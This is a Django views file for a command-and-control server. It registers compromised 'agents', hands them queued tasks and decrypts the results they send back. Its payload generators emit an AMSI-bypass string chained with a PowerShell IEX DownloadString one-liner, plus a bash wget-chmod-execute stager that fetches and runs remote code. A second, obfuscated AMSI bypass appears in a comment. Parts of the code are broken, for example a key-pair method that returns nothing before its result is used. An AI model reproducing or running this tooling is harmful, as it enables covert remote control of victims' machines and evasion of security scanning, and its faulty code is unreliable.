import base64
from django.conf import settings
from django.contrib.auth.decorators import login_required
from django.shortcuts import render 
from .forms import *
from .models import *
import netifaces
import os
import random
import string
from django.http import HttpResponse , JsonResponse
from django.views import View
from django.contrib.auth.models import User
from django.http import HttpResponseRedirect 
from .forms import UploadFileForm
from rest_framework.response import Response
from rest_framework.views import APIView
from .serializers import *
from datetime import datetime
import base64
import os
import hashlib
from Crypto import Random
from Crypto.Cipher import AES , PKCS1_OAEP
from Crypto.PublicKey import RSA

current_path= os.path.dirname(os.path.abspath(__file__))

listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
# app         = Flask(__name__)
port = 8000


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


#Agent Registeration by sending POST-Req with hostname & username after executing the payload on the Target
def registerAgent(request):
    if request.method=='POST':
        hostname = request.POST['hname']
        username = request.POST['username']
        remoteip = (get_client_ip(request))
        eth = request.POST['eth']
        
        if Agent.objects.filter(hname = hostname).filter(username=username).exists():
            data = Agent.objects.filter(hname = hostname).filter(username = username).values()[0]
            agentname = data['name']
            oldusername = data['username']
            if data['ip'] != remoteip:
                s=Agent.objects.filter(hname = hostname).get(username=username)
                s.ip = remoteip
                s.save()
        else:
            agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) #ASFASA
            key = generateKey()
            s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username, key=key )
            s.save() 

        Listener.agent(agentname,remoteip, eth)
        Listener.payloadGen(key)
        request.session['agentName'] = agentname
        response = HttpResponse(agentname)
        response.set_cookie('agentName' , agentname)
        return response
    else:
        return ('',204)


class AESCipher:
    
    def __init__(self, key):
        self.key = base64.b64decode(key)
        self.bs  = AES.block_size
        
    def encrypt(self, raw): 
        raw      = self.pad(raw)
        iv       = Random.new().read(AES.block_size)
        cipher   = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode("utf-8")))
    
    def decrypt(self,enc):
        enc      = base64.b64decode(enc)
        iv       = enc[:16]
        cipher   = AES.new(self.key, AES.MODE_CBC, iv)
        plain    = cipher.decrypt(enc[16:])
        plain    = self.unpad(plain)
        return plain 

    def pad(self, s):
        return s + (self.bs - len(s) % self.bs) * "\x00"

    def unpad(self, s):
        s = s.decode("utf-8")
        return s.rstrip("\x00")

def generateKey():
    key    = base64.b64encode(os.urandom(32))
    return key.decode()

def ENCRYPT(PLAIN, KEY):
    c   = AESCipher(KEY)
    enc = c.encrypt(PLAIN)
    return enc.decode()

def DECRYPT(ENC, KEY):
    c   = AESCipher(KEY)
    dec = c.decrypt(ENC)
    return dec

#RSA Encryption Class
class RsaEncryption(View):
    def __init__(self):
        super().__init__()
        # Generate an RSA key pair if it doesn't exist
        # try:
        #     with open('private_key.pem', 'rb') as f:
        #         self.private_key = RSA.import_key(f.read())
        # except FileNotFoundError:
        #     self.private_key = RSA.generate(2048)
        #     with open('private_key.pem', 'wb') as f:
        #         f.write(self.private_key.export_key())
        # self.public_key = self.private_key.publickey()

	# Generate an RSA key pair
    def generate_key_pair(self):
        self.private_key = RSA.generate(2048)
        self.public_key = self.private_key.publickey()
    
    # return public key
    def get_public_key(self):
        return self.public_key
    
	# Encrypt data using the public key
    def encrypt_with_public_key(self, data):
        cipher = PKCS1_OAEP.new(self.public_key)
        ciphertext = cipher.encrypt(data)
        return ciphertext.decode('utf-8')
        # removed base64 encoding as in linux functions its implemented and no encoding in windows
        # return base64.b64encode(ciphertext).decode('utf-8')

	# Recieve ciphertext and decrypt using the private key
    def decrypt_with_private_key(self, ciphertext): 
        # removed base64 decoding as in linux functions its implemented and no encoding in windows
        # ciphertext = base64.b64decode(ciphertext)
        cipher = PKCS1_OAEP.new(self.private_key)
        data = cipher.decrypt(ciphertext)
        return data.decode('utf-8')

	# Encrypt the AES key using the public key (optional and depends on the key transferring method)
    def get(self, request):
        aes_key = b'mysecretkey'
        encrypted_aes_key = self.encrypt_with_public_key(aes_key)

        # Return the encrypted AES key in the response
        return HttpResponse(encrypted_aes_key)

class Listener():
    class PostListener(View):
        def post(self,request):    
            eth = request.POST['listener']
            listneres = ListenerForm.objects.all()
            if not listneres:
                listnerForm = ListenerForm()
                listnerForm.interface = eth
                listnerForm.created_date= datetime.now()
                listnerForm.save()
                return JsonResponse({'data': True},status=200)
            else:
                for listener in listneres:
                    if listener.interface == eth:
                        oListener = ListenerForm.objects.get(interface = eth)
                        oListener.created_date = datetime.now()
                        oListener.save()
                        return JsonResponse({'data': True},status=200)
                    else:       
                        listnerForm = ListenerForm()
                        listnerForm.interface = eth
                        listnerForm.created_date= datetime.now()
                        listnerForm.save()
                        return JsonResponse({'data': True},status=200)

        def get(self,request):
            listeners = ListenerForm.objects.order_by("-created_date").all()
            return render(request, 'blog/listeners.html' , {"listeners" : listeners})

    class payloadGen(View):

        def __init__(self, key):
            self.key= key

        def post(self,request):
            eth = request.POST['listener']      
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']

            output_path= "/tmp/{}".format(eth)
            with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            payload = payload.replace('REPLACE_KEY',self.key)
            
            with open(output_path,"wt") as R:
                R.write(payload)

            with open(listen_path+"/{}".format(eth),"wt") as R:
                R.write(payload)

            listener = ListenerForm.objects.get(interface= eth)
            if listener:
                listener.ip = ip
                listener.save()
            amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
            oneliner = "{} IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')".format(amsi,ip, str(port), eth)
            return JsonResponse({"payload" : oneliner} , status=200)

#powershell.exe -nop -w hidden -c 

        def get(self,request):
            return render(request,'blog/payload-Gen.html')



    class lin_payloadGen(View):
        def post(self,request):
            eth = request.POST['listener']
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            output_path= "/tmp/{}".format(eth)
            key_gen = RsaEncryption().generate_key_pair()
            public_key=key_gen.get_public_key()
            with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            payload = payload.replace('REPLACE_PUB_KEY',public_key)
            with open(output_path,"wt") as R:
                R.write(payload)

            with open(listen_path+"/{}".format(eth),"wt") as R:
                R.write(payload)
                
            listener = ListenerForm.objects.get(interface= eth)
            if listener:
                listener.ip = ip
                listener.save()    
                
            oneliner = "wget http://{}:{}/download/{} -O /tmp/bash;chmod +x /tmp/bash;bash /tmp/bash".format(ip, str(port), eth)
            return JsonResponse({"payload" : oneliner} , status=200)
            #return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})

        def get(self,request):
            return render(request,'blog/lin_payload-Gen.html')

    class agent():   
        
        def __init__(self, name, remote , eth):

            self.name      = name
            self.remote  = remote
            self.eth = eth
            self.sleept    = 3
            self.Path      = listen_path+"agents/{}/".format(self.name)
            self.tasksPath = "{}tasks".format(self.Path, self.name)
            netifaces.ifaddresses(eth)
            self.eth_ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            
            if os.path.exists(self.Path) == False:
                os.mkdir(self.Path)
                
        # def run(eth_ip,port):      ######multi threading with django or flask
        #     app.logger.disabled = True
        #     app.run(port=port, host=eth_ip)
            
        # def start(self):
        #     server = Process(target=Listener.agent.run(self.eth_ip,port))  
        #     cli = sys.modules['flask.cli']
        #     cli.show_server_banner = lambda *x: None
        #     daemon = threading.Thread(name = self.name,
        #                                     target = server.start,
        #                                     args= ())
        #     daemon.daemon = True
        #     daemon.start()
        #     try:
        #         Listener.agent.start(self)
        #         print("Listener started.")
        #     except:
        #         print("Failed. Check your options.")
                
# Create Download link to redirect to sendFile funtion
        def sendScript(request , eth=''):
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            # amsi     = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
            oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(ip,str(port),eth)
            return HttpResponse(oneliner)

# execute payload content to get the connection to our server
        def sendFile(request, eth=''):
            output_path= "/tmp/{}".format(eth)
            f    = open("{}".format(output_path), "rt")
            data = f.read()
            f.close()
            return HttpResponse(data)

# read tasks then remove tasks file
        def serveTasks(request,name=''):
            tasksPath = listen_path+"agents/{}/tasks".format(name)
            if os.path.exists(tasksPath):
                with open(tasksPath, "r") as f:
                    task = f.read()
                    
                os.remove(tasksPath)    
                return HttpResponse(task)
            else:
                return HttpResponse('')

        #Receive results from the Agent then put it in result file
        def receiveResults(request,name=''):
                resultspath = listen_path+"agents/{}/results".format(name)
                if request.method == 'POST':
                    encresult = request.POST['result']
                    agentdata = Agent.objects.filter(name=name).values()[0]
                    key = agentdata['key']
                    result= DECRYPT(encresult,key)
                    agent_Tasks = AgentTasks.objects.order_by("-created_date")[0]
                    agent_Tasks.task_result = result
                    agent_Tasks.save()
                    with open(resultspath,'a') as r:
                        r.write(result) 
                        r.close()
                    return HttpResponse('')
                else:
                    return HttpResponse('')

        #Recieve, decode and decrypt results from agent
        def LinreceiveResults(request,name=''):
            resultspath = listen_path+"agents/{}/results".format(name)
            if request.method == 'POST':
                result = request.body.decode()
                base64_bytes = result.encode('ascii')
                message_bytes = base64.b64decode(base64_bytes)
                result = message_bytes.decode('ascii')
                result = RsaEncryption.decrypt_with_private_key(result)
                with open(resultspath,'a') as r:
                    r.write(result) 
                    r.close()
                return HttpResponse('')
            else:
                return HttpResponse('')



#Imaginary function to handle an uploaded file. ########################                                           
def handle_uploaded_file(f):
    with open('uploaded', 'wb+') as destination:
        for chunk in f.chunks():
            destination.write(chunk)


def upload_file(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)
        if form.is_valid():
            handle_uploaded_file(request.FILES['file'])
            return HttpResponseRedirect('../homePage')
    else:
        form = UploadFileForm()
    return render(request, 'blog/upload.html', {'form': form})

#########################################################################

def LoginPage(request):
    return render(request  , 'blog/login.html' )

@login_required
def HomePage(request):
    listeners = ListenerForm.objects.all()
    agents = Agent.objects.all()
    #request.session['test'] = "Helo"
    response = render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners) , "agents" : list(agents) } )
    #response.set_cookie( 'test' , 'hello' )
    return response
    #return render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )

@login_required
def AgentPage(request):
    agents = Agent.objects.all()
    return render(request  , 'blog/agents.html' , {"agents" : list(agents)} )

@login_required
def Tasks(request , name):
    oAgent = Agent.objects.get(name = name)
    return render(request  , 'blog/tasks.html' , {"agentName": name , "agentId": oAgent.pk,   "currentPath" : current_path})

@login_required
def AgentTask(request , id):
    oAgentTask = AgentTasks.objects.get(pk = id)
    return render(request  , 'blog/agentTask.html' , {"oAgentTask": oAgentTask })

class GetAgentsTasks(APIView):
    def get(self , request , name):
        queryset = AgentTasks.objects.select_related('module').select_related('agent').select_related('user').filter(agent__name = name).order_by('-created_date').all()
        serializer = AgentTaskSerializer(queryset, many=True, context={'request': request})
        return Response(serializer.data)




    
class GetFileResult(APIView):
    def get(self , request , name):
        f = open("{}".format(current_path+"/data/listeners/agents/"+ name + "/results"), "rt")
        strFile = ''
        for lines in f.readlines():
            #strFile+="<pre class='my-0 py-0'>" + lines + "</pre>"
            strFile += lines
        task = f.read()
        f.close()   
        return HttpResponse(strFile ,  content_type="text/plain")

class TasksApi(APIView):
    def get(self , request , type):
        if type == 0:
            queryset = Modules.objects.all()   
        elif type == 1:
              queryset = Modules.objects.filter(module_type=1) 
        elif type == 2:
              queryset = Modules.objects.filter(module_type=2)
        elif type == 3:
              queryset = Modules.objects.filter(module_type=3)
        elif type == 4:
              queryset = Modules.objects.filter(module_type=4)
        else:
             queryset = Modules.objects.filter(module_type=5)
             
        serializer = ModuleSerializer(queryset, many=True, context={'request': request})
        return Response(serializer.data)


@login_required
def ListenersPage(request):
    return render(request  , 'blog/listeners.html' )



@login_required
def HackerUser(request):
    Users  = User.objects.all()
    return render(request  , 'blog/creatuser.html' , {'users' : list(Users) } )


@login_required
def Launcher(request):
    return render(request  , 'blog/launcher.html')